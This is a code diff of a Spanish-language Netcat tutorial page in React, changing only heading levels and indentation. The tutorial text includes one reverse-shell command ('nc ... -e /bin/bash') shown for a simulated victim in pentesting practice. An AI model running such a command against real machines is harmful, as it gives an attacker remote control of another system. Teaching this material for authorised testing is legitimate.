@@ -61,6 +61,7 @@ function nameabcd({ }) {
         <TemarioCompleto temario={Temario} />
 
         <Titulo title="h2" id="qué-es-netcat">¿Qué es Netcat?</Titulo>
+
         <Texto><strong>Netcat</strong> (abreviado nc) es una
           herramienta de línea de comandos usada para:</Texto>
         <Lista>
@@ -86,11 +87,11 @@ function nameabcd({ }) {
         <Codigo code={`nc [opciones] [host] [puerto]`} language="bash" />
         <Linea />
         <Titulo title="h2" id="modos-principales-de-uso">Modos principales de uso</Titulo>
-        <Titulo title="h3" id="cliente-tcp">Cliente TCP</Titulo>
+        <Titulo title="h2" id="cliente-tcp">Cliente TCP</Titulo>
         <Texto>Conectarse a un servidor:</Texto>
         <Codigo code={`nc 127.0.0.1 8080`} language="bash" />
         <Texto>Esto abre una conexión al puerto 8080 del localhost.</Texto>
-        <Titulo title="h3" id="servidor-tcp">Servidor TCP</Titulo>
+        <Titulo title="h2" id="servidor-tcp">Servidor TCP</Titulo>
         <Texto>Escuchar conexiones:</Texto>
         <Codigo code={`nc -l -p 8080`} language="bash" />
         <Texto>-l → modo escucha</Texto>
@@ -110,7 +111,7 @@ nc -u 127.0.0.1 6000`} language="bash" />
         <Texto> -u → activa modo UDP.</Texto>
         <Linea />
         <Titulo title="h2" id="transferencia-de-archivos">Transferencia de archivos</Titulo>
-        <Titulo title="h3" id="enviar-un-archivo">Enviar un archivo</Titulo>
+        <Titulo title="h2" id="enviar-un-archivo">Enviar un archivo</Titulo>
         <Texto>Servidor que recibirá:</Texto>
         <Codigo code={`nc -l -p 5000 > archivo_recibido.txt`} language="bash" />
         <Texto>Cliente que envía:</Texto>
@@ -143,9 +144,9 @@ nc -u 127.0.0.1 6000`} language="bash" />
         <Texto>Netcat puede crear conexiones remotas tipo <strong>shell
           inversa</strong>, usadas en <strong>pentesting</strong> (no
           ilegalmente).</Texto>
-        <Titulo title="h3" id="en-el-servidor-escuchando">En el servidor (escuchando)</Titulo>
+        <Titulo title="h2" id="en-el-servidor-escuchando">En el servidor (escuchando)</Titulo>
         <Codigo code={`nc -l -p 4444 -v`} language="bash" />
-        <Titulo title="h3" id="en-la-víctima-simulada">En la víctima (simulada)</Titulo>
+        <Titulo title="h2" id="en-la-víctima-simulada">En la víctima (simulada)</Titulo>
         <Codigo code={`nc 192.168.1.100 4444 -e /bin/bash`} language="bash" />
         <Texto>Esto le da al servidor una consola remota de la otra máquina.
           <em>(Solo en entornos controlados o de práctica legal.)</em>
@@ -188,10 +189,10 @@ nc -u 127.0.0.1 6000`} language="bash" />
         </Tabla>
         <Linea />
         <Titulo title="h2" id="ejemplo-práctico-completo">Ejemplo práctico completo</Titulo>
-        <Titulo title="h3" id="crear-servidor-de-eco">Crear servidor de eco</Titulo>
+        <Titulo title="h2" id="crear-servidor-de-eco">Crear servidor de eco</Titulo>
         <Codigo code={`# Servidor
 nc -l -p 1234 -v`} language="bash" />
-        <Titulo title="h3" id="cliente">Cliente</Titulo>
+        <Titulo title="h2" id="cliente">Cliente</Titulo>
         <Codigo code={`nc 127.0.0.1 1234`} language="bash" />
         <Texto>Ahora cualquier texto que envíes se reflejará entre ambos.</Texto>
         <Linea />
@@ -241,7 +242,7 @@ nc -l -p 1234 -v`} language="bash" />
           <li><strong>PowerCat</strong> (en Windows PowerShell): equivalente en
             sistemas modernos.</li>
         </Lista>
-     </Estructura>
+      </Estructura>
 
       <TemarioAsideCompleto temario={Temario} />
     </>
